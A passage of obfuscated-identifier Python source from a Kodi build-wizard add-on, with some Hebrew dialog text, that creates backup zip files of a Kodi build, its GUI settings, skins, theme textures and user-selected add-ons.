        middle ='[ %s ]'%middle #line:2474
        O0OO0000OOO0O0OO0 =int ((40 -len (middle ))/2 )#line:2475
        O000OO000O00O00O0 ="%s%s%s"%(O000OO000O00O00O0 [:O0OO0000OOO0O0OO0 ],middle ,O000OO000O00O00O0 [:O0OO0000OOO0O0OO0 +2 ])#line:2476
    return O000OO000O00O00O0 [:40 ]#line:2477
def convertAdvanced ():#line:2479
    if os .path .exists (ADVANCED ):#line:2480
        O000O0O0000000OOO =open (ADVANCED )#line:2481
        OOOOO00O0OO0O0OOO =O000O0O0000000OOO .read ()#line:2482
        if KODIV >=17 :#line:2483
            return #line:2484
        else :#line:2485
            return #line:2486
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2487
def backUpOptions (O000O000OOO0O000O ,name =""):#line:2492
    OOO000O0O00O00OO0 =[ADDON_ID ,'cache','system','Thumbnails','peripheral_data','temp','My_Builds','library','keymaps']#line:2493
    OOO00O0O0O0O00OO0 =['Textures13.db','.DS_Store','advancedsettings.xml','Thumbs.db','.gitignore']#line:2494
    O0OO0O0OO0OOO0O0O =[os .path .join (DATABASE ,'onechannelcache.db'),os .path .join (DATABASE ,'saltscache.db'),os .path .join (DATABASE ,'saltscache.db-shm'),os .path .join (DATABASE ,'saltscache.db-wal'),os .path .join (DATABASE ,'saltshd.lite.db'),os .path .join (DATABASE ,'saltshd.lite.db-shm'),os .path .join (DATABASE ,'saltshd.lite.db-wal'),os .path .join (ADDOND ,'script.trakt','queue.db'),os .path .join (HOME ,'cache','commoncache.db'),os .path .join (ADDOND ,'script.module.dudehere.routines','access.log'),os .path .join (ADDOND ,'script.module.dudehere.routines','trakt.db'),os .path .join (ADDOND ,'script.module.metahandler','meta_cache','video_cache.db')]#line:2506
    O000OOO000O00O0OO =translatepath (BACKUPLOCATION )#line:2508
    OO0O00OO00000OOO0 =translatepath (MYBUILDS )#line:2509
    try :#line:2510
        if not os .path .exists (O000OOO000O00O0OO ):xbmcvfs .mkdirs (O000OOO000O00O0OO )#line:2511
        if not os .path .exists (OO0O00OO00000OOO0 ):xbmcvfs .mkdirs (OO0O00OO00000OOO0 )#line:2512
    except Exception as OOOO0O0O0O00OOO0O :#line:2513
        DIALOG .ok (ADDONTITLE ,"[COLOR %s]Error making Back Up directories:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,str (OOOO0O0O0O00OOO0O )))#line:2514
        return #line:2515
    if O000O000OOO0O000O =="build":#line:2516
        if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם ברצונך לגבות את הבילד?[/COLOR]"%COLOR2 ,nolabel ="[B][COLOR red]ביטול[/COLOR][/B]",yeslabel ="[B][COLOR green]גיבוי[/COLOR][/B]"):#line:2517
            if name =="":#line:2518
                name =getKeyboard ("","אנא הכנס שם ל %s באנגלית"%O000O000OOO0O000O )#line:2519
                if not name :return False #line:2520
                name =name .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:2521
            name =urllib .quote_plus (name );O00OOOOO0OOO0O0OO =''#line:2522
            OO0O0OO0OOOO0OOO0 =os .path .join (OO0O00OO00000OOO0 ,'%s.zip'%name )#line:2523
            O0OO000O000000OO0 =0 #line:2524
            O00OO0OOO00O00000 =[]#line:2525
            if not DIALOG .yesno (ADDONTITLE ,"האם לשמור את תיקית האדון דאטה?",yeslabel ='[B][COLOR green]שמור[/COLOR][/B]',nolabel ='[B][COLOR red]לא לשמור[/COLOR][/B]'):#line:2526
                OOO000O0O00O00OO0 .append ('addon_data')#line:2527
            convertSpecial (HOME ,True )#line:2528
            asciiCheck (HOME ,True )#line:2529
            try :#line:2530
                O0O00OO0O0000O0O0 =zipfile .ZipFile (translatepath (OO0O0OO0OOOO0OOO0 ),mode ='w')#line:2531
            except :#line:2532
                try :#line:2533
                    O00OOOOO0OOO0O0OO =os .path .join (PACKAGES ,'%s.zip'%name )#line:2534
                    O0O00OO0O0000O0O0 =zipfile .ZipFile (O00OOOOO0OOO0O0OO ,mode ='w')#line:2535
                except :#line:2536
                    log ("Unable to create %s.zip"%name ,5 )#line:2537
                    if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]We are unable to write to the current backup directory, would you like to change the location?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Change Directory[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]"):#line:2538
                        openS ()#line:2539
                        return #line:2540
                    else :#line:2541
                        return #line:2542
            DP .create ("[COLOR %s]%s[/COLOR][COLOR %s]: Creating Zip[/COLOR]"%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Creating back up zip"%COLOR2 ,"","Please Wait...[/COLOR]")#line:2543
            for O0000OOO0O0OOOO0O ,OOO0O0O0OO0O0O0O0 ,O00OO0OO00OOOO0O0 in os .walk (HOME ):#line:2544
                OOO0O0O0OO0O0O0O0 [:]=[O00O0O00OO0O000OO for O00O0O00OO0O000OO in OOO0O0O0OO0O0O0O0 if O00O0O00OO0O000OO not in OOO000O0O00O00OO0 ]#line:2545
                O00OO0OO00OOOO0O0 [:]=[O00O000OO000OOOOO for O00O000OO000OOOOO in O00OO0OO00OOOO0O0 if O00O000OO000OOOOO not in OOO00O0O0O0O00OO0 ]#line:2546
                for OOOO0O0OO0OO000OO in O00OO0OO00OOOO0O0 :#line:2547
                    O00OO0OOO00O00000 .append (OOOO0O0OO0OO000OO )#line:2548
            O000O0OOOO0O00OO0 =len (O00OO0OOO00O00000 )#line:2549
            for O0000OOO0O0OOOO0O ,OOO0O0O0OO0O0O0O0 ,O00OO0OO00OOOO0O0 in os .walk (HOME ):#line:2550
                OOO0O0O0OO0O0O0O0 [:]=[O000O0O00OOOOOOO0 for O000O0O00OOOOOOO0 in OOO0O0O0OO0O0O0O0 if O000O0O00OOOOOOO0 not in OOO000O0O00O00OO0 ]#line:2551
                O00OO0OO00OOOO0O0 [:]=[O00OOOOO0OO00000O for O00OOOOO0OO00000O in O00OO0OO00OOOO0O0 if O00OOOOO0OO00000O not in OOO00O0O0O0O00OO0 ]#line:2552
                for OOOO0O0OO0OO000OO in O00OO0OO00OOOO0O0 :#line:2553
                    try :#line:2554
                        O0OO000O000000OO0 +=1 #line:2555
                        OOO0O0000000O00OO =percentage (O0OO000O000000OO0 ,O000O0OOOO0O00OO0 )#line:2556
                        DP .update (int (OOO0O0000000O00OO ),'[COLOR %s]Creating back up zip: [COLOR%s]%s[/COLOR] / [COLOR%s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO000O000000OO0 ,COLOR1 ,O000O0OOOO0O00OO0 ),'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOO0O0OO0OO000OO ),'')#line:2557
                        O00O00O000000O000 =os .path .join (O0000OOO0O0OOOO0O ,OOOO0O0OO0OO000OO )#line:2558
                        if OOOO0O0OO0OO000OO in LOGFILES :log ("[Back Up] Type = '%s': Ignore %s"%(O000O000OOO0O000O ,OOOO0O0OO0OO000OO ),5 );continue #line:2559
                        elif os .path .join (O0000OOO0O0OOOO0O ,OOOO0O0OO0OO000OO )in O0OO0O0OO0OOO0O0O :log ("[Back Up] Type = '%s': Ignore %s"%(O000O000OOO0O000O ,OOOO0O0OO0OO000OO ),5 );continue #line:2560
                        elif os .path .join ('addons','packages')in O00O00O000000O000 :log ("[Back Up] Type = '%s': Ignore %s"%(O000O000OOO0O000O ,OOOO0O0OO0OO000OO ),5 );continue #line:2561
                        elif OOOO0O0OO0OO000OO .endswith ('.csv'):log ("[Back Up] Type = '%s': Ignore %s"%(O000O000OOO0O000O ,OOOO0O0OO0OO000OO ),5 );continue #line:2562
                        elif OOOO0O0OO0OO000OO .endswith ('.pyo'):continue #line:2563
                        elif OOOO0O0OO0OO000OO .endswith ('.db')and 'Database'in O0000OOO0O0OOOO0O :#line:2564
                            O0OOO00OOOO0000O0 =OOOO0O0OO0OO000OO .replace ('.db','')#line:2565
                            O0OOO00OOOO0000O0 =''.join ([O00O0OOO00O0OO000 for O00O0OOO00O0OO000 in O0OOO00OOOO0000O0 if not O00O0OOO00O0OO000 .isdigit ()])#line:2566
                            if O0OOO00OOOO0000O0 in ['Addons','ADSP','Epg','MyMusic','MyVideos','Textures','TV','ViewModes']:#line:2567
                                if not OOOO0O0OO0OO000OO ==latestDB (O0OOO00OOOO0000O0 ):log ("[Back Up] Type = '%s': Ignore %s"%(O000O000OOO0O000O ,OOOO0O0OO0OO000OO ),5 );continue #line:2568
                        try :#line:2569
                            O0O00OO0O0000O0O0 .write (O00O00O000000O000 ,O00O00O000000O000 [len (HOME ):],zipfile .ZIP_DEFLATED )#line:2570
                        except :pass #line:2571
                    except :pass #line:2572
            O0O00OO0O0000O0O0 .close ()#line:2573
            xbmc .sleep (500 )#line:2574
            DP .update (100 ,"Creating %s_guisettings.zip"%name ,"","")#line:2575
            backUpOptions ('guifix',name )#line:2576
            if not O00OOOOO0OOO0O0OO =='':#line:2577
                OOOO0000OO00OO0O0 =xbmcvfs .rename (O00OOOOO0OOO0O0OO ,OO0O0OO0OOOO0OOO0 )#line:2578
                if OOOO0000OO00OO0O0 ==0 :#line:2579
                    xbmcvfs .copy (O00OOOOO0OOO0O0OO ,OO0O0OO0OOOO0OOO0 )#line:2580
                    xbmcvfs .delete (O00OOOOO0OOO0O0OO )#line:2581
            DP .close ()#line:2582
            DIALOG .ok (ADDONTITLE ,"[COLOR %s]%s[/COLOR] [COLOR %s]backup successful:[/COLOR]"%(COLOR1 ,name ,COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0OO0OOOO0OOO0 ))#line:2583
    elif O000O000OOO0O000O =="guifix":#line:2584
        if name =="":#line:2585
            OOO0O0O0O0OOO0OO0 =getKeyboard ("","Please enter a name for the %s zip"%O000O000OOO0O000O )#line:2586
            if not OOO0O0O0O0OOO0OO0 :return False #line:2587
            convertSpecial (USERDATA ,True )#line:2588
            asciiCheck (USERDATA ,True )#line:2589
        else :OOO0O0O0O0OOO0OO0 =name #line:2590
        OOO0O0O0O0OOO0OO0 =urllib .quote_plus (OOO0O0O0O0OOO0OO0 );OOO0O00OO00O00OOO =''#line:2591
        OO0OO0OOOO000OOO0 =translatepath (os .path .join (OO0O00OO00000OOO0 ,'%s_guisettings.zip'%OOO0O0O0O0OOO0OO0 ))#line:2592
        if os .path .exists (GUISETTINGS ):#line:2593
            try :#line:2594
                O0O00OO0O0000O0O0 =zipfile .ZipFile (OO0OO0OOOO000OOO0 ,mode ='w')#line:2595
            except :#line:2596
                try :#line:2597
                    OOO0O00OO00O00OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO0O0O0O0OOO0OO0 )#line:2598
                    O0O00OO0O0000O0O0 =zipfile .ZipFile (OOO0O00OO00O00OOO ,mode ='w')#line:2599
                except :#line:2600
                    log ("Unable to create %s_guisettings.zip"%OOO0O0O0O0OOO0OO0 ,5 )#line:2601
                    if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]We are unable to write to the current backup directory, would you like to change the location?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Change Directory[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]"):#line:2602
                        openS ()#line:2603
                        return #line:2604
                    else :#line:2605
                        return #line:2606
            try :#line:2607
                O0O00OO0O0000O0O0 .write (GUISETTINGS ,'guisettings.xml',zipfile .ZIP_DEFLATED )#line:2608
                O0O00OO0O0000O0O0 .write (PROFILES ,'profiles.xml',zipfile .ZIP_DEFLATED )#line:2609
                O0O00000O000OO0OO =glob .glob (os .path .join (ADDOND ,'skin.*',''))#line:2610
                log (str (O0O00000O000OO0OO ),5 )#line:2611
                for O0OO0OO0O00O0OO0O in O0O00000O000OO0OO :#line:2612
                    OO0O0O0OO00O0OOOO =os .path .split (O0OO0OO0O00O0OO0O [:-1 ])[1 ]#line:2613
                    if not OO0O0O0OO00O0OOOO in ['skin.confluence','skin.re-touch','skin.estuary','skin.myconfluence','skin.estouchy','skin.anonymous.mod','skin.anonymous.nox','skin.Premium.mod']:#line:2614
                        if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to add the following skin folder to the GuiFix Zip File?[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0O0OO00O0OOOO ),yeslabel ="[B][COLOR green]Add Skin[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Skin[/COLOR][/B]"):#line:2615
                            for O0000OOO0O0OOOO0O ,OOO0O0O0OO0O0O0O0 ,O00OO0OO00OOOO0O0 in os .walk (os .path .join (ADDOND ,O0OO0OO0O00O0OO0O )):#line:2616
                                O00OO0OO00OOOO0O0 [:]=[OOO00O000OOO0OO0O for OOO00O000OOO0OO0O in O00OO0OO00OOOO0O0 if OOO00O000OOO0OO0O not in OOO00O0O0O0O00OO0 ]#line:2617
                                for OOOO0O0OO0OO000OO in O00OO0OO00OOOO0O0 :#line:2618
                                    O00O00O000000O000 =os .path .join (O0000OOO0O0OOOO0O ,OOOO0O0OO0OO000OO )#line:2619
                                    O0O00OO0O0000O0O0 .write (O00O00O000000O000 ,O00O00O000000O000 [len (USERDATA ):],zipfile .ZIP_DEFLATED )#line:2620
                            O0O00000O000OO0OO =parseDOM (link ,'import',ret ='addon')#line:2621
                            if 'script.skinshortcuts'in O0O00000O000OO0OO :#line:2622
                                for O0000OOO0O0OOOO0O ,OOO0O0O0OO0O0O0O0 ,O00OO0OO00OOOO0O0 in os .walk (os .path .join (ADDOND ,'script.skinshortcuts')):#line:2623
                                    O00OO0OO00OOOO0O0 [:]=[O0OOOOO000OOO0000 for O0OOOOO000OOO0000 in O00OO0OO00OOOO0O0 if O0OOOOO000OOO0000 not in OOO00O0O0O0O00OO0 ]#line:2624
                                    for OOOO0O0OO0OO000OO in O00OO0OO00OOOO0O0 :#line:2625
                                        O00O00O000000O000 =os .path .join (O0000OOO0O0OOOO0O ,OOOO0O0OO0OO000OO )#line:2626
                                        O0O00OO0O0000O0O0 .write (O00O00O000000O000 ,O00O00O000000O000 [len (USERDATA ):],zipfile .ZIP_DEFLATED )#line:2627
                        else :log ("[Back Up] Type = '%s': %s ignored"%(O000O000OOO0O000O ,O0OO0OO0O00O0OO0O ),5 )#line:2628
            except Exception as OOOO0O0O0O00OOO0O :#line:2629
                log ("[Back Up] Type = '%s': %s"%(O000O000OOO0O000O ,OOOO0O0O0O00OOO0O ),5 )#line:2630
                pass #line:2631
            O0O00OO0O0000O0O0 .close ()#line:2632
            if not OOO0O00OO00O00OOO =='':#line:2633
                OOOO0000OO00OO0O0 =xbmcvfs .rename (OOO0O00OO00O00OOO ,OO0OO0OOOO000OOO0 )#line:2634
                if OOOO0000OO00OO0O0 ==0 :#line:2635
                    xbmcvfs .copy (OOO0O00OO00O00OOO ,OO0OO0OOOO000OOO0 )#line:2636
                    xbmcvfs .delete (OOO0O00OO00O00OOO )#line:2637
        else :log ("[Back Up] Type = '%s': guisettings.xml not found"%O000O000OOO0O000O ,5 )#line:2638
        if name =="":#line:2639
            DIALOG .ok (ADDONTITLE ,"[COLOR %s]GuiFix backup successful:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO0OOOO000OOO0 ))#line:2640
    elif O000O000OOO0O000O =="theme":#line:2641
        if not DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to create a theme backup?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Continue[/COLOR][/B]",nolabel ="[B][COLOR red]No Cancel[/COLOR][/B]"):LogNotify ("Theme Backup","Cancelled!");return False #line:2642
        if name =="":#line:2643
            O0OOO0O000O00O000 =getKeyboard ("","Please enter a name for the %s zip"%O000O000OOO0O000O )#line:2644
            if not O0OOO0O000O00O000 :return False #line:2645
        else :O0OOO0O000O00O000 =name #line:2646
        O0OOO0O000O00O000 =urllib .quote_plus (O0OOO0O000O00O000 );O00OOOOO0OOO0O0OO =''#line:2647
        OO0O0OO0OOOO0OOO0 =os .path .join (OO0O00OO00000OOO0 ,'%s.zip'%O0OOO0O000O00O000 )#line:2648
        try :#line:2649
            O0O00OO0O0000O0O0 =zipfile .ZipFile (translatepath (OO0O0OO0OOOO0OOO0 ),mode ='w')#line:2650
        except :#line:2651
            try :#line:2652
                O00OOOOO0OOO0O0OO =os .path .join (PACKAGES ,'%s.zip'%O0OOO0O000O00O000 )#line:2653
                O0O00OO0O0000O0O0 =zipfile .ZipFile (O00OOOOO0OOO0O0OO ,mode ='w')#line:2654
            except :#line:2655
                log ("Unable to create %s.zip"%O0OOO0O000O00O000 ,5 )#line:2656
                if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]We are unable to write to the current backup directory, would you like to change the location?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]Change Directory[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]"):#line:2657
                    openS ()#line:2658
                    return #line:2659
                else :#line:2660
                    return #line:2661
        convertSpecial (USERDATA ,True )#line:2662
        asciiCheck (USERDATA ,True )#line:2663
        try :#line:2664
            if not SKIN =='skin.confluence':#line:2665
                O000OOO0OOO00OO0O =os .path .join (ADDONS ,SKIN ,'media')#line:2666
                O0OOO000O00O0OO00 =glob .glob (os .path .join (O000OOO0OOO00OO0O ,'*.xbt'))#line:2667
                if len (O0OOO000O00O0OO00 )>1 :#line:2668
                    if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to go through the Texture Files for?[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,SKIN ),yeslabel ="[B][COLOR green]Add Textures[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Textures[/COLOR][/B]"):#line:2669
                        O000OOO0OOO00OO0O =os .path .join (ADDONS ,SKIN ,'media')#line:2670
                        O0OOO000O00O0OO00 =glob .glob (os .path .join (O000OOO0OOO00OO0O ,'*.xbt'))#line:2671
                        for O0O0O0O00OOOOOO0O in O0OOO000O00O0OO00 :#line:2672
                            if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to add the Texture File [COLOR %s]%s[/COLOR]?"%(COLOR1 ,COLOR2 ,O0O0O0O00OOOOOO0O .replace (O000OOO0OOO00OO0O ,"")[1 :]),"from [COLOR %s]%s[/COLOR][/COLOR]"%(COLOR1 ,SKIN ),yeslabel ="[B][COLOR green]Add Textures[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Textures[/COLOR][/B]"):#line:2673
                                O00O00O000000O000 =O0O0O0O00OOOOOO0O #line:2674
                                O0OO0000O00O000O0 =O00O00O000000O000 .replace (HOME ,"")#line:2675
                                O0O00OO0O0000O0O0 .write (O00O00O000000O000 ,O0OO0000O00O000O0 ,zipfile .ZIP_DEFLATED )#line:2676
                else :#line:2677
                    for O0O0O0O00OOOOOO0O in O0OOO000O00O0OO00 :#line:2678
                        if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to add the Texture File [COLOR %s]%s[/COLOR]?"%(COLOR2 ,COLOR1 ,O0O0O0O00OOOOOO0O .replace (O000OOO0OOO00OO0O ,"")[1 :]),"from [COLOR %s]%s[/COLOR][/COLOR]"%(COLOR1 ,SKIN ),yeslabel ="[B][COLOR green]Add Textures[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Textures[/COLOR][/B]"):#line:2679
                            O00O00O000000O000 =O0O0O0O00OOOOOO0O #line:2680
                            O0OO0000O00O000O0 =O00O00O000000O000 .replace (HOME ,"")#line:2681
                            O0O00OO0O0000O0O0 .write (O00O00O000000O000 ,O0OO0000O00O000O0 ,zipfile .ZIP_DEFLATED )#line:2682
                OOO0OOOOO000000O0 =os .path .join (ADDOND ,SKIN ,'settings.xml')#line:2683
                if os .path .exists (OOO0OOOOO000000O0 ):#line:2684
                    if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to go add the [COLOR %s]settings.xml[/COLOR] in [COLOR %s]/addon_data/[/COLOR] for?"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,SKIN ),yeslabel ="[B][COLOR green]Add Settings[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Settings[/COLOR][/B]"):#line:2685
                        O000OOO0OOO00OO0O =os .path .join (ADDOND ,SKIN )#line:2686
                        O0O00OO0O0000O0O0 .write (OOO0OOOOO000000O0 ,OOO0OOOOO000000O0 .replace (HOME ,""),zipfile .ZIP_DEFLATED )#line:2687
                OO00OO00000O0000O =open (os .path .join (ADDONS ,SKIN ,'addon.xml'));OOOO00O00OO00OO00 =OO00OO00000O0000O .read ();OO00OO00000O0000O .close ()#line:2688
                O0O00000O000OO0OO =parseDOM (OOOO00O00OO00OO00 ,'import',ret ='addon')#line:2689
                if 'script.skinshortcuts'in O0O00000O000OO0OO :#line:2690
                    if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to go add the [COLOR %s]settings.xml[/COLOR] for [COLOR %s]script.skinshortcuts[/COLOR]?"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Add Settings[/COLOR][/B]",nolabel ="[B][COLOR red]Skip Settings[/COLOR][/B]"):#line:2691
                        for O0000OOO0O0OOOO0O ,OOO0O0O0OO0O0O0O0 ,O00OO0OO00OOOO0O0 in os .walk (os .path .join (ADDOND ,'script.skinshortcuts')):#line:2692
                            O00OO0OO00OOOO0O0 [:]=[O00O0OOO00O0O0O0O for O00O0OOO00O0O0O0O in O00OO0OO00OOOO0O0 if O00O0OOO00O0O0O0O not in OOO00O0O0O0O00OO0 ]#line:2693
                            for OOOO0O0OO0OO000OO in O00OO0OO00OOOO0O0 :#line:2694
                                O00O00O000000O000 =os .path .join (O0000OOO0O0OOOO0O ,OOOO0O0OO0OO000OO )#line:2695
                                O0O00OO0O0000O0O0 .write (O00O00O000000O000 ,O00O00O000000O000 [len (HOME ):],zipfile .ZIP_DEFLATED )#line:2696
            if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to include a [COLOR %s]Backgrounds[/COLOR] folder?[/COLOR]"%(COLOR2 ,COLOR1 ),yeslabel ="[B][COLOR green]Yes Include[/COLOR][/B]",nolabel ="[B][COLOR red]No Continue[/COLOR][/B]"):#line:2697
                O00O00O000000O000 =DIALOG .browse (0 ,'Select location of backgrounds','files','',True ,False ,HOME ,False )#line:2698
                if not O00O00O000000O000 ==HOME :#line:2699
                    for O0000OOO0O0OOOO0O ,OOO0O0O0OO0O0O0O0 ,O00OO0OO00OOOO0O0 in os .walk (O00O00O000000O000 ):#line:2700
                        OOO0O0O0OO0O0O0O0 [:]=[O000O0O0O0OOO00OO for O000O0O0O0OOO00OO in OOO0O0O0OO0O0O0O0 if O000O0O0O0OOO00OO not in OOO000O0O00O00OO0 ]#line:2701
                        O00OO0OO00OOOO0O0 [:]=[OOO0OOOOO00OOOOO0 for OOO0OOOOO00OOOOO0 in O00OO0OO00OOOO0O0 if OOO0OOOOO00OOOOO0 not in OOO00O0O0O0O00OO0 ]#line:2702
                        for OOOO0O0OO0OO000OO in O00OO0OO00OOOO0O0 :#line:2703
                            try :#line:2704
                                O0OO0000O00O000O0 =os .path .join (O0000OOO0O0OOOO0O ,OOOO0O0OO0OO000OO )#line:2705
                                O0O00OO0O0000O0O0 .write (O0OO0000O00O000O0 ,O0OO0000O00O000O0 [len (HOME ):],zipfile .ZIP_DEFLATED )#line:2706
                            except Exception as OOOO0O0O0O00OOO0O :#line:2707
                                log ("[Back Up] Type = '%s': Unable to backup %s"%(O000O000OOO0O000O ,OOOO0O0OO0OO000OO ),5 )#line:2708
                                log ("Backup Error: %s"%str (OOOO0O0O0O00OOO0O ),5 )#line:2709
                O0000OOOOOO0OO000 =latestDB ('Textures')#line:2710
                if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to include the [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0000OOOOOO0OO000 ),yeslabel ="[B][COLOR green]Yes Include[/COLOR][/B]",nolabel ="[B][COLOR red]No Continue[/COLOR][/B]"):#line:2711
                    O0O00OO0O0000O0O0 .write (os .path .join (DATABASE ,O0000OOOOOO0OO000 ),'/userdata/Database/%s'%O0000OOOOOO0OO000 ,zipfile .ZIP_DEFLATED )#line:2712
            if DIALOG .yesno ('[COLOR %s]%s[/COLOR][COLOR %s]: Theme Backup[/COLOR]'%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Would you like to include any addons?[/COLOR]"%(COLOR2 ),yeslabel ="[B][COLOR green]Yes Include[/COLOR][/B]",nolabel ="[B][COLOR red]No Continue[/COLOR][/B]"):#line:2713
                O0OO0OO0O00O0OO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:2714
                O00OOO00O00OOOOO0 =[];O0O00000OO0O00OO0 =[]#line:2715
                for OO0OOOOOO0O00O000 in sorted (O0OO0OO0O00O0OO0O ,key =lambda O000O0O0O0OO0O0OO :O000O0O0O0OO0O0OO ):#line:2716
                    O00OO00OOOO000OOO =os .path .split (OO0OOOOOO0O00O000 [:-1 ])[1 ]#line:2717
                    if O00OO00OOOO000OOO in EXCLUDES :continue #line:2718
                    elif O00OO00OOOO000OOO in DEFAULTPLUGINS :continue #line:2719
                    elif O00OO00OOOO000OOO =='packages':continue #line:2720
                    O0OO00O00OOOO0000 =os .path .join (OO0OOOOOO0O00O000 ,'addon.xml')#line:2721
                    if os .path .exists (O0OO00O00OOOO0000 ):#line:2722
                        OO00OO00000O0000O =open (O0OO00O00OOOO0000 )#line:2723
                        OO0O0OOOO00O000OO =OO00OO00000O0000O .read ()#line:2724
                        O0O00000O000OO0OO =parseDOM (OO0O0OOOO00O000OO ,'addon',ret ='name')#line:2725
                        if len (O0O00000O000OO0OO )>0 :#line:2726
                            O00OOO00O00OOOOO0 .append (O0O00000O000OO0OO [0 ])#line:2727
                            O0O00000OO0O00OO0 .append (O00OO00OOOO000OOO )#line:2728
                        else :#line:2729
                            O00OOO00O00OOOOO0 .append (O00OO00OOOO000OOO )#line:2730
                            O0O00000OO0O00OO0 .append (O00OO00OOOO000OOO )#line:2731
                if KODIV >16 :#line:2732
                    OOOOO0O0000OO00OO =DIALOG .multiselect ("%s: Select the addons you wish to add to the zip."%ADDONTITLE ,O00OOO00O00OOOOO0 )#line:2733
                else :#line:2734
                    OOOOO0O0000OO00OO =[];OO0OOOO0O0OOO00OO =0 #line:2735
                    OO0O0OO000O0OO0O0 =["-- Click here to Continue --"]+O00OOO00O00OOOOO0 #line:2736
                    while not OO0OOOO0O0OOO00OO ==-1 :#line:2737
                        OO0OOOO0O0OOO00OO =DIALOG .select ("%s: Select the addons you wish to add to the zip."%ADDONTITLE ,OO0O0OO000O0OO0O0 )#line:2738
                        if OO0OOOO0O0OOO00OO ==-1 :break #line:2739
                        elif OO0OOOO0O0OOO00OO ==0 :break #line:2740
                        else :#line:2741
                            OO00OO0OOO000O00O =(OO0OOOO0O0OOO00OO -1 )#line:2742
                            if OO00OO0OOO000O00O in OOOOO0O0000OO00OO :#line:2743
                                OOOOO0O0000OO00OO .remove (OO00OO0OOO000O00O )#line:2744
                                OO0O0OO000O0OO0O0 [OO0OOOO0O0OOO00OO ]=O00OOO00O00OOOOO0 [OO00OO0OOO000O00O ]#line:2745
                            else :#line:2746
                                OOOOO0O0000OO00OO .append (OO00OO0OOO000O00O )#line:2747
                                OO0O0OO000O0OO0O0 [OO0OOOO0O0OOO00OO ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O00OOO00O00OOOOO0 [OO00OO0OOO000O00O ])#line:2748
                if len (OOOOO0O0000OO00OO )>0 :#line:2749
                    for O00O00000OO00000O in OOOOO0O0000OO00OO :#line:2750
                        for O0000OOO0O0OOOO0O ,OOO0O0O0OO0O0O0O0 ,O00OO0OO00OOOO0O0 in os .walk (os .path .join (ADDONS ,O0O00000OO0O00OO0 [O00O00000OO00000O ])):#line:2751
                            O00OO0OO00OOOO0O0 [:]=[OO000OOO0OO000OO0 for OO000OOO0OO000OO0 in O00OO0OO00OOOO0O0 if OO000OOO0OO000OO0 not in OOO00O0O0O0O00OO0 ]#line:2752
                            for OOOO0O0OO0OO000OO in O00OO0OO00OOOO0O0 :#line:2753
                                if OOOO0O0OO0OO000OO .endswith ('.pyo'):continue #line:2754
                                O00O00O000000O000 =os .path .join (O0000OOO0O0OOOO0O ,OOOO0O0OO0OO000OO )#line:2755
                                O0O00OO0O0000O0O0 .write (O00O00O000000O000 ,O00O00O000000O000 [len (HOME ):],zipfile .ZIP_DEFLATED )#line:2756
